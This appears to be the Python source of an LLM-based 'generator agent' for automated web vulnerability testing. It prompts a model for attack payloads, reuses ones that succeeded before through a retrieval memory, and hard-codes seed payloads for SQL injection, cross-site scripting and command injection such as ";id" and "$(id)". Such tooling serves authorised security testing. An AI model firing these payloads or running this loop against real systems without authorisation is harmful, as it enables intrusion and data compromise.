"""Generator Agent: creates initial attack payloads with RAG memory support."""

import json
from prompts import GENERATOR_PROMPT
from llm import LLMClient
from tools.memory import AttackMemory


class GeneratorAgent:
    def __init__(self, llm: LLMClient, memory: AttackMemory = None):
        self.llm = llm
        self.memory = memory

    def generate(
        self,
        vuln_type: str,
        endpoint: str,
        field_name: str,
        field_context: str = "string",
        history: list = None,
        count: int = 8,
    ) -> list[dict]:
        """Generate initial payloads, enriched by RAG memory retrieval."""
        history_str = json.dumps(history[-3:], indent=2, default=str) if history else "None"

        # RAG retrieval: query similar past attempts
        rag_results = []
        successful_payloads = []
        if self.memory:
            similar = self.memory.query_similar(
                payload=f"{vuln_type} {endpoint} {field_name}",
                vuln_type=vuln_type,
                n_results=5,
            )
            rag_results = similar

            successes = self.memory.query_successful(vuln_type=vuln_type, n_results=3)
            successful_payloads = successes

        rag_str = json.dumps(rag_results, indent=2, default=str) if rag_results else "None (first run)"
        success_str = json.dumps(successful_payloads, indent=2, default=str) if successful_payloads else "None"

        result = self.llm.generate_json(
            GENERATOR_PROMPT,
            f"vuln_type: {vuln_type}\n"
            f"endpoint: {endpoint}\n"
            f"field_name: {field_name}\n"
            f"field_context: {field_context}\n"
            f"rag_results: {rag_str}\n"
            f"successful_payloads: {success_str}\n"
            f"history: {history_str}\n"
            f"count: {count}",
        )

        payloads = result.get("payloads", [])
        if not payloads:
            payloads = self._seed_payloads(vuln_type)[:count]

        # Inject RAG-retrieved successful payloads as seeds
        if successful_payloads:
            for sp in successful_payloads:
                seed = {"payload": sp["payload"], "type": "rag_success", "reasoning": "from memory"}
                if seed not in payloads:
                    payloads.insert(0, seed)

        return payloads[:count]

    def _seed_payloads(self, vuln_type: str) -> list[dict]:
        """Built-in seed payloads as fallback."""
        if vuln_type == "sqli":
            return [
                {"payload": "'", "type": "error_based", "reasoning": "SQL syntax error test"},
                {"payload": "' OR 1=1--", "type": "boolean_blind", "reasoning": "Classic bypass"},
                {"payload": "' OR '1'='1'--", "type": "boolean_blind", "reasoning": "String bypass"},
                {"payload": "1 OR 1=1", "type": "boolean_blind", "reasoning": "Numeric context"},
                {"payload": "' UNION SELECT NULL--", "type": "union_based", "reasoning": "UNION probe"},
                {"payload": "' AND SLEEP(3)--", "type": "time_based", "reasoning": "MySQL time-based"},
                {"payload": "'; WAITFOR DELAY '0:0:3'--", "type": "time_based", "reasoning": "MSSQL time-based"},
                {"payload": "' AND 1=1--", "type": "boolean_blind", "reasoning": "Boolean true"},
                {"payload": "' AND 1=2--", "type": "boolean_blind", "reasoning": "Boolean false"},
                {"payload": "') OR ('1'='1", "type": "boolean_blind", "reasoning": "Parenthesis context"},
                {"payload": "' UNION SELECT NULL,NULL--", "type": "union_based", "reasoning": "Two columns"},
                {"payload": "' ORDER BY 1--", "type": "union_based", "reasoning": "Column count"},
            ]
        elif vuln_type == "xss":
            return [
                {"payload": "<script>alert(1)</script>", "type": "reflected_xss", "reasoning": "Basic script"},
                {"payload": "<img src=x onerror=alert(1)>", "type": "reflected_xss", "reasoning": "IMG handler"},
                {"payload": "<svg onload=alert(1)>", "type": "reflected_xss", "reasoning": "SVG onload"},
                {"payload": "'\"><script>alert(1)</script>", "type": "reflected_xss", "reasoning": "Break attribute"},
                {"payload": "javascript:alert(1)", "type": "reflected_xss", "reasoning": "JS URI"},
                {"payload": "<details open ontoggle=alert(1)>", "type": "reflected_xss", "reasoning": "HTML5 event"},
                {"payload": "<body onload=alert(1)>", "type": "reflected_xss", "reasoning": "Body onload"},
                {"payload": "\"><img src=x onerror=alert(1)>", "type": "reflected_xss", "reasoning": "Double quote break"},
            ]
        elif vuln_type == "cmdi":
            return [
                {"payload": ";id", "type": "cmdi", "reasoning": "Basic command separator"},
                {"payload": "&&id", "type": "cmdi", "reasoning": "AND operator"},
                {"payload": "|id", "type": "cmdi", "reasoning": "Pipe operator"},
                {"payload": "$(id)", "type": "cmdi", "reasoning": "Command substitution"},
                {"payload": "`id`", "type": "cmdi", "reasoning": "Backtick substitution"},
                {"payload": ";sleep 5", "type": "cmdi_blind", "reasoning": "Time-based blind"},
                {"payload": "%0aid", "type": "cmdi", "reasoning": "Newline injection"},
            ]
        return [{"payload": "test", "type": "generic", "reasoning": "default"}]
